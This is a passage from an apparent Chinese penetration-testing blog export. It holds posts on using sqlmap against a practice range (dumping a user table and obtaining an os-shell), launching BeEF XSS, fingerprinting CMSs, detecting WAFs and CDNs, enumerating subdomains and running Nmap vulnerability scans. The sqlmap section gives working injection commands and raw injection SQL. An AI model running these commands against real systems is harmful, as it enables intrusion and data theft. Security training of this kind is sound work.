    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h1><blockquote>
<ul>
<li><p><a href="http://59.63.200.79:8804/single.php?id=1" target="_blank" rel="noopener">http://59.63.200.79:8804/single.php?id=1</a></p>
</li>
<li><p>明显存在sql注入</p>
</li>
</ul>
</blockquote>
<h1 id="基础实践sqlmap形式"><a href="#基础实践sqlmap形式" class="headerlink" title="基础实践sqlmap形式"></a>基础实践sqlmap形式</h1><blockquote>
<ul>
<li><p>工具安装地址：<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p>
</li>
<li><p>sqlmap实战</p>
<ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615202146348.png" alt="image-20210615202146348"></p>
</li>
<li><p><strong>探测出含有的注入类型</strong> </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615202231495.png" alt="image-20210615202231495"></li>
</ul>
</li>
<li><p>查库 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 --dbs --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
</li>
</ul>
<pre><code>- ![image-20210615202426295](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615202426295.png)
- ![image-20210615202438699](https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615202438699.png)</code></pre><ul>
<li><p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 -D cake --tables --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615202857064.png" alt="image-20210615202857064"></p>
</li>
<li><p>查值 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 -D cake -T user --dump --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615203002794.png" alt="image-20210615203002794"></p>
</li>
<li><p>扫不出后台地址，试试能不能直接getshell</p>
</li>
<li><p>测试 –is-dba </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php?id&#x3D;1 --is-dba --batch --threads&#x3D;10</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616081257017.png" alt="image-20210616081257017"></p>
</li>
</ul>
<ul>
<li><p>绝对路径 把is-dba改成–sql-shell  </p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616081642436.png" alt="image-20210616081642436"></p>
</li>
<li><p>直接 把–sql-shell改成os-shell拿到shell了</p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616081758213.png" alt="image-20210616081758213"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616081846898.png" alt="image-20210616081846898"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616081946989.png" alt="image-20210616081946989"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616082010229.png" alt="image-20210616082010229"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210616082035329.png" alt="image-20210616082035329"></p>
</li>
</ul>
</blockquote>
<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><blockquote>
<p><strong>一、查看数据库相关信息</strong></p>
<ul>
<li><strong>–current-user 枚举当前用户</strong></li>
<li><strong>–current-db 枚举当前数据库</strong></li>
<li><strong>–dbs 枚举当前可用数据库</strong></li>
<li><strong>–is-dba 枚举当前数据库权限</strong></li>
<li><strong>–password 枚举当前数据库用户密码</strong></li>
</ul>
<p><strong>二、指纹识别</strong></p>
<ul>
<li><strong>-f  启用广泛的指纹识别</strong></li>
<li><strong>-b 检测数据库指纹</strong></li>
<li><strong>–hostname 枚举主机名称</strong></li>
</ul>
<p><strong>三、Waf识别</strong></p>
<ul>
<li><strong>–identify-waf 检测waf信息</strong></li>
</ul>
<p><strong>四、sqlmap更新</strong></p>
<ul>
<li><strong>–update 更新</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">小知识</span><br><span class="line">如果网页是http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php&#x2F;id&#x2F;1.html</span><br><span class="line">可能存在伪静态 也可以在javascript中 使用 alert(document.lastModified)</span><br><span class="line">直接正常注入就行</span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;59.63.200.79:8804&#x2F;single.php&#x2F;id&#x2F;1.html</span><br></pre></td></tr></table></figure></div>

<h1 id="常见的注入方式"><a href="#常见的注入方式" class="headerlink" title="常见的注入方式"></a>常见的注入方式</h1><blockquote>
<ul>
<li><p><strong>基本操作上面已经写了。其他百度</strong></p>
</li>
<li><p><strong>-l burp.log  加载request日志</strong></p>
</li>
<li><p><strong>–batch   自动选Y</strong></p>
</li>
<li><p><strong>–smart 启发式快速判断，节约时间</strong></p>
</li>
<li><p><strong>Cookie注入</strong></p>
<ul>
<li><pre><code>--cookie &quot;id=2&quot;
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- **Post注入**</span><br><span class="line"></span><br><span class="line">  - **使用** </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--forms 自动搜索表单信息
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 请求延时注入</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--delay 1 
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 等级 1-5</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--level 5
2级以上会尝试cookie
3级以上就对head注入
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 自动更换请求头</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--user-agent
防止被人工办了
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 获取表中的数量</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--count
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 风险等级</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
--risk 3
大于2 就开始or updatexml进行测试，可能造成更新整个表。
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- --sql-shell 数据库操作</span><br><span class="line"></span><br><span class="line">- --os-shell 系统操作</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
条件
一、测试--is-dba必须是true
二、需要知道绝对路径，利用--sql-shell
三、GPC为off，php主动转义的功能关闭
四、secure_file-priv为空

可以自动生成，上传脚本文件、后门文件
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"># 系统库注入</span><br><span class="line"></span><br><span class="line">- 表名</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1;</span><br></pre></td></tr></table></figure></div></code></pre></li>
</ul>
</li>
<li><p>列名</p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'a_user'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>


</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
        <tag>漏洞工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】BEEF基本启动方式</title>
    <url>/2021/06/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%B7%A5%E5%85%B7%E3%80%91BEEF%E5%9F%BA%E6%9C%AC%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="beef-Xss"><a href="#beef-Xss" class="headerlink" title="beef-Xss"></a>beef-Xss</h1><blockquote>
<ul>
<li>beef： http:// github.com/beefproject/beef</li>
<li>vim /etc/beef-xss/config.yaml 修改配置文件<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615190716808.png" alt="image-20210615190716808"></li>
</ul>
</li>
<li>beef-xss启动<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615190818323.png" alt="image-20210615190818323"></li>
</ul>
</li>
</ul>
<ul>
<li><a href="http://192.168.136.134:3000/demos/butcher/index.html" target="_blank" rel="noopener">http://192.168.136.134:3000/demos/butcher/index.html</a><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615190841239.png" alt="image-20210615190841239"></li>
</ul>
</li>
<li><a href="http://192.168.136.134:3000/ui/panel" target="_blank" rel="noopener">http://192.168.136.134:3000/ui/panel</a><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615190856360.png" alt="image-20210615190856360"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615191306116.png" alt="image-20210615191306116"></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试工具</tag>
        <tag>工具</tag>
        <tag>AWVS</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】CMS指纹识别</title>
    <url>/2021/06/15/%E3%80%90%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%91CMS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h1><blockquote>
<p>查找环境 ： <a href="http://59.63.200.79:8803/" target="_blank" rel="noopener">http://59.63.200.79:8803/</a></p>
<p>快速二次开发的web应用框架</p>
<ul>
<li>1、唯一性</li>
<li>2、方便性</li>
<li>3、终身不变性</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615104907533.png" alt="image-20210615104907533"></p>
<blockquote>
<p><strong>在线和离线的方式收集指纹信息</strong></p>
<ul>
<li><p><strong>1、云悉在线： <a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></strong></p>
</li>
<li><p><strong>2、Whatweb：<a href="http://www.whatweb.net" target="_blank" rel="noopener">http://www.whatweb.net</a></strong></p>
<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615105840106.png" alt="image-20210615105840106"></li>
</ul>
</li>
<li><p><strong>3、插件-wappalyer：<a href="https://www.wappalyzer.com/" target="_blank" rel="noopener">https://www.wappalyzer.com/</a></strong></p>
<ul>
<li><p><strong>谷歌插件搬运工：<a href="https://chrome.zzzmh.cn/info?token=gppongmhjkpfnbhagpmjfkannfbllamg" target="_blank" rel="noopener">https://chrome.zzzmh.cn/info?token=gppongmhjkpfnbhagpmjfkannfbllamg</a></strong></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615112249180.png" alt="image-20210615112249180"></p>
</li>
</ul>
</li>
<li><p>4、<strong>脚本CMSeek：<a href="http://github.com/Tuhinshubhra/CMSeek" target="_blank" rel="noopener">http://github.com/Tuhinshubhra/CMSeek</a></strong></p>
<ul>
<li><strong>git clone <a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMSeeK</a></strong></li>
<li><strong>cd CMSeek</strong></li>
<li><strong>pip3 install -r requirements.txt</strong></li>
<li><strong>python3 cmseek.py -u <a href="http://59.63.200.79:8803/" target="_blank" rel="noopener">http://59.63.200.79:8803/</a></strong>   </li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615112846889.png" alt="image-20210615112846889"></li>
</ul>
</li>
<li><p><strong>5、Webfinger：<a href="http://github.com/se55i0n/Webfinger" target="_blank" rel="noopener">http://github.com/se55i0n/Webfinger</a></strong></p>
</li>
</ul>
</blockquote>
<h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><blockquote>
<p><strong>常见的WAF产品以及检测方法</strong></p>
<ul>
<li><strong>1、Awesome-WAF项目</strong><ul>
<li><strong><a href="http://github.com/0xlnfection/Awesome-WAF" target="_blank" rel="noopener">http://github.com/0xlnfection/Awesome-WAF</a></strong></li>
</ul>
</li>
<li><strong>2、检测脚本：wafw00f</strong><ul>
<li><strong><a href="http://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">http://github.com/EnableSecurity/wafw00f</a></strong><ul>
<li><strong>git clone <a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></strong></li>
<li><strong>python setup.py install</strong></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615114439982.png" alt="image-20210615114439982"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="内容分发网CDN"><a href="#内容分发网CDN" class="headerlink" title="内容分发网CDN"></a>内容分发网CDN</h1><blockquote>
<p>CDN全称Content Delivery Network，内容分发网络。</p>
<ul>
<li>国内在线 CDN云观测： <a href="http://cdn.chinaz.com/" target="_blank" rel="noopener">http://cdn.chinaz.com/</a></li>
<li>国外在线 cdnplanet ：  <a href="https://www.cdnplanet.com/" target="_blank" rel="noopener">https://www.cdnplanet.com/</a></li>
<li>脚本canteen：xcdn ： <a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210615120512907.png" alt="image-20210615120512907"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试工具</tag>
        <tag>信息收集</tag>
        <tag>指纹识别</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】子域名收集和目录扫描</title>
    <url>/2021/06/15/%E3%80%90%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%91%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%92%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="子域名收集的作用"><a href="#子域名收集的作用" class="headerlink" title="子域名收集的作用"></a>子域名收集的作用</h1><blockquote>
<ul>
<li>扩大渗透测试的范围</li>
<li>找到目标站点突破口</li>
<li>业务边界安全</li>
</ul>
</blockquote>
<h1 id="收集子域名的方法"><a href="#收集子域名的方法" class="headerlink" title="收集子域名的方法"></a>收集子域名的方法</h1><blockquote>
<ul>
<li>在线收集子域名<ul>
<li>通过特定谷歌语法查询子域名：site: qq.com</li>
<li>在线枚举爆破：<a href="http://phpinfo.me/domain" target="_blank" rel="noopener">http://phpinfo.me/domain</a></li>
<li>基于SSL证书查询子域：<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li>
<li>基于DNS记录查找子域名：<a href="https://dns.bufferover.run/dns?q=zkaq.cnu.com" target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=zkaq.cnu.com</a></li>
</ul>
</li>
<li>Fuzzdomain工具:使用git clone <a href="https://github.com/aboul3la/sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/sublist3r</a><ul>
<li>安装模块： sudo pip install -r requirements.txt</li>
<li><img src="https://img-blog.csdnimg.cn/img_convert/66a598dd0f655a3e3ff31e63f3e85713.png" alt="image-20210615083703485"></li>
<li>枚举目标子域 <strong>python2 sublist3r.py -d zkaq.org</strong></li>
<li>枚举子域名并且显示开放80和443端口的子域： <strong>python2 sublist3r.py -d zkaq.cn -p 80,443</strong><ul>
<li><img src="https://img-blog.csdnimg.cn/img_convert/93ba26156386cb6251725ffa09f3c8f2.png" alt="image-20210615094546932"></li>
</ul>
</li>
<li>保存 <strong>python2 sublist3r.py -d zkaq.cn -o zkaq.txt</strong></li>
</ul>
</li>
<li>用户事件<ul>
<li>历史漏洞 ： 乌云镜像：<a href="https://www.anquan.us" target="_blank" rel="noopener">https://www.anquan.us</a></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="使用御剑扫描敏感目录"><a href="#使用御剑扫描敏感目录" class="headerlink" title="使用御剑扫描敏感目录"></a>使用御剑扫描敏感目录</h1><blockquote>
<ul>
<li><p><strong>御剑</strong>：一个比较好的后台扫描工具</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fee730cd34b81c16f2b7d3fdb4d34589.png" alt="image-20210615095502128"></p>
</li>
</ul>
</blockquote>
<h1 id="常见的目录信息泄露"><a href="#常见的目录信息泄露" class="headerlink" title="常见的目录信息泄露"></a>常见的目录信息泄露</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/e2d4889a2729382fc3300c243ec017aa.png" alt="image-20210615103150633"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试工具</tag>
        <tag>信息收集</tag>
        <tag>子域名</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集工具】Nmap基础使用</title>
    <url>/2021/06/14/%E3%80%90%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E3%80%91Nmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Nmap常用扫描指令"><a href="#Nmap常用扫描指令" class="headerlink" title="Nmap常用扫描指令"></a>Nmap常用扫描指令</h1><h2 id="Nmap下载"><a href="#Nmap下载" class="headerlink" title="Nmap下载"></a>Nmap下载</h2><blockquote>
<p>官网：nmap.org</p>
<p>我的指令测试网站（大家都可以进）：<a href="http://59.63.200.79:8802/" target="_blank" rel="noopener">http://59.63.200.79:8802/</a></p>
</blockquote>
<h2 id="常用的端口扫描指令"><a href="#常用的端口扫描指令" class="headerlink" title="常用的端口扫描指令"></a>常用的端口扫描指令</h2><blockquote>
<ul>
<li><strong>如果是超级用户，无参数扫描等价于sS参数扫描</strong></li>
<li><strong>否则，无参数扫描等价于sT参数扫描（TCP，完整连接）</strong></li>
<li><strong>-sS： TCP SYN 扫描</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614201038985.png" alt="image-20210614201038985"></li>
</ul>
</li>
<li><strong>-p : 指定端口号扫描</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614200448662.png" alt="image-20210614200448662"></li>
</ul>
</li>
<li><strong>-v ： 显示扫描过程</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614200609830.png" alt="image-20210614200609830"></li>
</ul>
</li>
<li><strong>-F：快速扫描</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614201433133.png" alt="image-20210614201433133"></li>
</ul>
</li>
<li><strong>-Pn ： 禁止ping后扫描 –&gt;跳过主机发现的过程进行端口扫描</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614201507962.png" alt="image-20210614201507962"></li>
</ul>
</li>
<li><strong>-A: 全面的系统扫描：包括打开操作系统探测、版本探测、脚本扫描、路径跟踪</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614201608967.png" alt="image-20210614201608967"></li>
</ul>
</li>
<li><strong>-sU:  UDP扫描</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614202002324.png" alt="image-20210614202002324"></li>
</ul>
</li>
<li><strong>-sT: TCP扫描</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614201858709.png" alt=""></li>
</ul>
</li>
<li><strong>-sV: 扫描系统版本和程序版本号检测</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614202024173.png" alt="image-20210614202024173"></li>
</ul>
</li>
<li><strong>–script=vuln : 全面漏洞扫描</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614202936594.png" alt="image-20210614202936594"></li>
</ul>
</li>
<li><strong>-n： 禁止反向域名解析</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614202428352.png" alt="image-20210614202428352"></li>
</ul>
</li>
<li><strong>-R：反向域名解析</strong><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614202336984.png" alt="image-20210614202336984"></li>
</ul>
</li>
<li><strong>-6： 启动IPV6扫描</strong></li>
<li><strong>扫描指定ip开放端口</strong><ul>
<li>nmap -sS -p 80 -v 59.63.200.79<ul>
<li>穿透防火墙扫描 nmap -Pn -A 59.63.200.79  –&gt;服务器禁止ping命令 就使用<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614200903852.png" alt="image-20210614200903852"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Nmap扫描状态"><a href="#Nmap扫描状态" class="headerlink" title="Nmap扫描状态"></a>Nmap扫描状态</h1><blockquote>
<ul>
<li><strong>Opend：端口开启</strong></li>
<li><strong>Closed：端口关闭</strong></li>
<li><strong>Filtered：端口被过滤，数据没有到达主机</strong></li>
<li><strong>Unfilered：未被过滤，数据有到达主机，不能识别端口当前状态</strong></li>
<li><strong>Open | filtered： 开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中</strong></li>
<li><strong>Closed | filtered： 关闭或者被过滤，只发生在IP iD idle扫描</strong></li>
</ul>
</blockquote>
<h1 id="Nmap漏洞扫描"><a href="#Nmap漏洞扫描" class="headerlink" title="Nmap漏洞扫描"></a>Nmap漏洞扫描</h1><blockquote>
<ul>
<li><strong>使用Nmap中的脚本进行信息收集</strong><ul>
<li>whois 信息  <ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614205814016.png" alt="image-20210614205814016"></li>
<li>nmap –script=whois-domain zkaq.cn</li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614205108905.png" alt="image-20210614205108905"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614205059280.png" alt="image-20210614205059280"></li>
<li>脚本路径 /usr/share/nmap/scripts/<ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614205009260.png" alt="image-20210614205009260"></li>
</ul>
</li>
</ul>
</li>
<li>DNS解析查询<ul>
<li>使用DNS爆破脚本进行dns解析扫描 <strong>nmap –script=dns-brute zkaq.cn</strong></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614205840977.png" alt="image-20210614205840977"></li>
<li>nmap –script=dns -brute zkaq.cn</li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614210137975.png" alt="image-20210614210137975"></li>
</ul>
</li>
</ul>
</li>
<li><strong>nmap官方脚本</strong><ul>
<li><a href="https://svn.nmap.org/nmap/scripts/" target="_blank" rel="noopener">https://svn.nmap.org/nmap/scripts/</a></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Nmap报告输出"><a href="#Nmap报告输出" class="headerlink" title="Nmap报告输出"></a>Nmap报告输出</h1><blockquote>
<ul>
<li>把Nmap扫描结果保存到本地<ul>
<li>标准保存<ul>
<li>nmap -oN test.txt zkaq.cn   –&gt; outName缩写oN</li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614213142905.png" alt="image-20210614213142905"></li>
</ul>
</li>
<li>保存为xml格式<ul>
<li>nmap -oX test .xml zkaq.cn  –&gt; outXml缩写oX</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试工具</tag>
        <tag>信息收集</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】Google hack语法基础</title>
    <url>/2021/06/14/%E3%80%90%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%91Google%20hack%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="搜索引擎-amp-amp-Google-hack语法"><a href="#搜索引擎-amp-amp-Google-hack语法" class="headerlink" title="搜索引擎 &amp;&amp; Google hack语法"></a>搜索引擎 &amp;&amp; Google hack语法</h1><h2 id="信息搜集的作用"><a href="#信息搜集的作用" class="headerlink" title="信息搜集的作用"></a>信息搜集的作用</h2><h3 id="为什么要进行信息收集"><a href="#为什么要进行信息收集" class="headerlink" title="为什么要进行信息收集"></a>为什么要进行信息收集</h3><blockquote>
<ul>
<li>获得信息</li>
<li>了解对方</li>
<li>掌握情况</li>
<li>寻找弱点</li>
<li>安全短板</li>
</ul>
</blockquote>
<h3 id="信息搜集的内容"><a href="#信息搜集的内容" class="headerlink" title="信息搜集的内容"></a>信息搜集的内容</h3><blockquote>
<p>针对目标系统所相关的信息</p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210614181353352.png" alt="image-20210614181353352"></p>
</blockquote>
<h2 id="传统搜索引擎"><a href="#传统搜索引擎" class="headerlink" title="传统搜索引擎"></a>传统搜索引擎</h2><blockquote>
<p><strong>传统搜索引擎有效的抓取对方网站页面内容</strong></p>
<ul>
<li>公司动态</li>
<li>组织文档</li>
<li>用户名/密码</li>
<li>测试文件</li>
<li>历史数据</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">传统搜索引擎针对网页内容以及网页标题等相关信息进行抓取，提供给我们进行查阅</span><br></pre></td></tr></table></figure></div>

<h2 id="Google-hack语法"><a href="#Google-hack语法" class="headerlink" title="Google hack语法"></a>Google hack语法</h2><blockquote>
<p>常见的Google语法，帮助我们缩小范围</p>
<ul>
